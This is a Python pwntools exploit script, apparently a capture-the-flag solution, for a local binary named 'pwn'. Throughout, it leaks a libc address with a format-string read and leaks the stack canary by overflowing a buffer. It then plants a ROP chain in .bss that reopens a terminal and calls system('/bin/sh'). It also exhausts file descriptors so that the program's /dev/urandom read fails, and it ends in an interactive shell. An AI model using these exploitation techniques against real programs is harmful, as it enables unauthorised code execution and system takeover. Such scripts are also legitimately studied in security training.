from pwn import *
from time import sleep

r=process('./pwn')
elf=ELF('pwn')

def leakCanary(content):
	r.sendlineafter('Guess your option:','1')
	r.sendafter('..\n',content)
def bssStore(content,choice):
	r.sendlineafter('Guess your option:','2')
	r.sendlineafter('...\n',content)
	r.sendlineafter('y/n\n',choice)
def recursion(content,choice):
	r.sendlineafter('...\n',content)
	r.sendlineafter('y/n\n',choice)
def fsb():
	r.sendlineafter('Guess your option:','3')
	r.sendafter('?)\n','%a')
	r.recvuntil('0x0.0')
	return int(r.recv(12),16)
def fuckRand(content):
	r.recvuntil('Guess your option:')
	r.sendline('9011')
	r.recvuntil('code:')
	r.send(content)

log.warn('Which cmd do you want to run?')
#cmd=raw_input('cmd:')

log.info('Leak Libc')
libc_base=fsb()-0x3c56a3
log.success('libc_base='+str(hex(libc_base)))
libc=ELF('libc-2.23.so')

log.info('Push Stack')
r.sendlineafter('Guess your option:','2')
for i in range(4):
	recursion(str(i),'n')
recursion('FUCK','y')

log.info('Leak Canary')
leakCanary('0'*0xa9)
r.recv(0xa9)
canary=u64('\x00'+r.recv(7))
log.success('canary='+str(hex(canary)))

log.info('ROP stored in .bss')
pop_rdi_ret=0x400c53
pop_rsi_r15_ret=0x400c51
rop='C0ss4ck!'+p64(canary)+p64(0x7fffffffffff)	
for i in range(0x10,0x20):
	rop+=p64(pop_rdi_ret)+p64(i)+p64(elf.plt['close'])
rop+=p64(pop_rdi_ret)+p64(0x602260)+p64(pop_rsi_r15_ret)+p64(0x2)+p64(0x0)+p64(elf.plt['open'])
rop+=p64(pop_rdi_ret)+p64(0x602270)+p64(libc_base+libc.symbols['system'])
rop+='/dev/pts/2\x00'.ljust(0x10,'\x00')
#rop+=cmd
rop+='/bin/sh\x00'
bssStore(rop,'y')

log.info('Hijack Urandom with maxfd')
for i in range(1024):
	fuckRand('a')
fuckRand('\x00')
r.recvuntil('...\n')

r.interactive()